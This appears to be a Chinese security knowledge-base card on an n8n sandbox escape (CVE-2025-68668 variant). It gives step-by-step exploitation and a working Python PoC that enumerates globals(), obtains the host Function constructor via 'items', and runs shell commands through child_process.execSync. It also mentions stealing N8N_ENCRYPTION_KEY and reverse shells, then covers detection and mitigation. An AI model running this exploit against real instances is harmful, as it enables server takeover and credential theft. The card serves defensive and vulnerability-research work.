---
id: web-nodejs-n8n-pyodide-globals-constructor-enumeration
title: n8n Pyodide Python Code 节点：遍历 globals() 找未封锁 constructor.constructor 的 JS 代理（items）逃逸（CVE-2025-68668 变体）
type: scenario
domain: web
path: web/nodejs
technique: n8n-pyodide-globals-constructor-enumeration
tags:
- n8n
- nodejs
- python
- pyodide
- sandbox-escape
- function-constructor
- globals
- items
- rce
- cve-2025-68668
cve:
- CVE-2025-68668
severity: critical
confidence: high
status: verified
affected_versions: '>= 1.0.0, < 2.0.0（2.0.0 修复；原文复现 1.116.0）'
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:32:01+08:00'
  notes: 已对照原文核对：GHSA-62r4-hw23-cc8v 截图确认 >=1.0.0 <2.0.0、2.0.0 修复、CVSS 9.9；14张图确认 os.system/sys.modules['js']/Object.constructor.constructor 封锁、runPythonAsync 注入 globals、globals() 枚举（47 keys，32 constructor，15 可建 Function）、items 的 constructor.constructor 可用、whoami 回显 success=true；触发条件要求可编辑工作流的已认证用户与原文一致。affected_versions 已按原文设置。无 sources/source_url。未在本机复跑 PoC。
url: /docs/web/nodejs/web-nodejs-n8n-pyodide-globals-constructor-enumeration/
draft: false
kb_aliases:
- n8n globals constructor
- Pyodide items constructor.constructor
- n8n Python 沙箱枚举
- globals() 找 Function 构造器
- CVE-2025-68668 变体
---

## 一句话结论

n8n `<2.0.0` 的 Pyodide Python Code 节点虽然把 `os.system`、`sys.modules['js']`、`Object.constructor.constructor` 都做了封锁，但 `runPythonAsync(runCode, {globals: globalsDict})` 把包含 `items` 等上下文对象的 JS 字典注入 Python globals；用户代码遍历 `globals()`，对每个 JS 代理取 `obj.constructor.constructor`，就能找到未被替换的宿主 `Function` 构造器，执行 Node 侧 JS，再经 `process.mainModule.require('child_process').execSync` 执行系统命令（CVE-2025-68668 的另一条逃逸路径）。

## 原理

- **沙箱初始化**：`LoadPyodide` 在 `runPythonAsync` 前执行一段 Python：`os.system = blocked_function`；`Object.constructor.constructor = blocked_function`；`sys.modules['js'] = blocked_module()`，`blocked_module.__getattr__` 直接抛 `RuntimeError("Blocked for security reasons")`。
- **globals 注入**：`PythonSandbox.runCodeInPython` 把 `this.context` 的每个 key 放入 `globalsDict`，再 `pyodide.runPythonAsync(runCode, { globals: globalsDict })`。context 包含 `_getNodeParameter`、`_getWorkflowStaticData`、`helpers`、`items`（`runOnceForAllItems` 时）等，这些是宿主 Node 对象/JS 代理。
- **封锁不对称**：`Object.constructor.constructor` 只封锁了 `Object` 这一条链；其他对象（如 `items`、`_items` 等数组/代理）的 `constructor` 仍指向各自构造器，其 `.constructor` 还是宿主 `Function`。文章遍历 `globals()` 打印每个 key 的 `constructor`/`constructor.constructor`，发现 `_getNodeParameter`、`_getWorkflowStaticData`、`helpers` 等会抛 "Blocked for security reasons"，而 `items` 等可以成功创建 Function。
- **逃逸**：拿到 `Function` 后执行 `Function("return process")()` 或 `Function("cmd", "return process.mainModule.require('child_process').execSync(cmd).toString()")`，代码在宿主 Node 上下文运行；`process.mainModule.require` 可加载 `child_process`/`fs`，执行命令、读文件，权限为 n8n 进程用户。
- **为什么成立**：Pyodide 的 JS 互操作把宿主对象暴露给 Python；安全边界不能只封锁一个全局构造器，必须阻断所有可达的 `constructor` 链或把执行放到独立沙箱。
- **影响版本**：GHSA-62r4-hw23-cc8v 标注 `>=1.0.0, <2.0.0`，2.0.0 修复；原文复现 1.116.0，CVSS 9.9。

## 触发条件

- n8n 版本 `>=1.0.0, <2.0.0`，Python Code 节点（Pyodide/Beta）可用。
- 攻击者拥有可创建/编辑并执行工作流的账号（已认证，不要求管理员）。
- 实例未通过 `NODES_EXCLUDE` 禁用 Code 节点，也未启用 task-runner 原生 Python 沙箱。
- n8n 进程用户有执行命令/读取文件的权限。

## 利用步骤

1. 登录 n8n，新建工作流，添加 Code 节点，语言选 Python（Beta），模式 `Run Once for All Items`。
2. 写枚举代码：遍历 `globals()`，对每个 key 取对象，尝试 `obj.constructor` 与 `obj.constructor.constructor`，捕获异常，记录哪些能创建 Function。
3. 从结果中选一个未被封锁的代理（文章为 `items`），用 `Function` 构造器执行 JS：
   - `Function("return process")()` 拿宿主 process；
   - `Function("cmd", "return process.mainModule.require('child_process').execSync(cmd).toString()")` 执行命令。
4. 执行工作流，读取返回的 `output`（文章截图显示 `success: true` 与命令输出）。
5. 进一步读取环境变量/配置文件/`N8N_ENCRYPTION_KEY`，或反弹 shell；授权测试只用 `id`/`whoami`/写标记文件。
6. 若 `items` 被封锁，继续枚举其他 context key、异常对象、`sys.modules`、`__builtins__` 等路径。

## PoC

```python
# n8n Python Code node, mode = Run Once for All Items
results = []
for key, obj in list(globals().items()):
    try:
        c1 = obj.constructor
        c2 = c1.constructor
        # 尝试用该构造器创建 Function
        fn = c2("return 1")
        results.append({"key": key, "can_create_function": fn() == 1})
    except Exception as e:
        results.append({"key": key, "error": str(e)})

# 选一个 can_create_function=True 的 key（文章为 items）
obj = globals()["items"]
HostFunction = obj.constructor.constructor
exec_in_js = HostFunction(
    "cmd",
    "const cp = process.mainModule.require('child_process');"
    "return cp.execSync(cmd).toString();"
)
return [{"json": {"success": True, "output": exec_in_js("whoami")}}]
```

说明：原文截图显示 `items` 的 `has_constructor_constructor: true`、`can_create_function: true`，最终 `success: true` 且回显命令输出；具体 context key 随 n8n 版本/节点模式变化，需先枚举。PoC 未在本机复跑。

## 变体与关联

- **key 变体**：`items`、`_items`、`helpers`（可能被封锁）、`_getNodeParameter`（可能被封锁）、`_getWorkflowStaticData`（可能被封锁）、异常对象、`sys.modules` 中的模块对象；以枚举结果为准。
- **构造器变体**：`obj.constructor.constructor`、`obj.__class__.__mro__`、`Function`/`eval`/`setTimeout` 等 JS 全局；只要有一条链回到宿主 Function 即可。
- **同 CVE 其他路径**：`js.XMLHttpRequest.constructor`（见关联卡）、`ctypes.CDLL(None).system`（原生运行器）、`sys.modules` 恢复 `js` 模块。
- **关联卡片**：[[web-nodejs-n8n-pyodide-xmlhttprequest-constructor-host-function-escape]]（同 CVE 的 XMLHttpRequest 路径）、[[web-nodejs-n8n-python-ctypes-cdll-system-sandbox-bypass]]（同 CVE 的 ctypes 路径）、[[ai-security-agent-security-prefab-ui-pyodide-deno-host-file-escape]]（Pyodide 宿主桥接逃逸）。
- **边界**：若 n8n 升级到 2.0.0+、禁用 Python Code 节点、或使用 task-runner 隔离，链条不成立；不同版本 context key 与封锁列表可能变化。

## 检测与防御

- **升级**：升级 n8n 到 2.0.0 或更高；确认 Python Code 节点使用 task-runner 原生隔离。
- **禁用/隔离**：不需要 Python Code 节点时用 `NODES_EXCLUDE` 禁用，或 `N8N_PYTHON_ENABLED=false`；必须使用时在独立低权限容器运行，阻断 `execve`/网络/敏感文件。
- **沙箱加固**：不要向 Pyodide 注入宿主对象；对所有可达对象的 `constructor` 链做代理/白名单；在 Node `vm` 之外再加 OS 级隔离。
- **检测**：审计 Code 节点中的 `globals()`、`constructor`、`Function`、`mainModule`、`child_process`、`execSync` 等字符串；监控 n8n 进程派生的异常子进程与文件访问。
- **响应**：隔离实例，轮换 `N8N_ENCRYPTION_KEY`、数据库与外部凭据，审计工作流与执行日志。
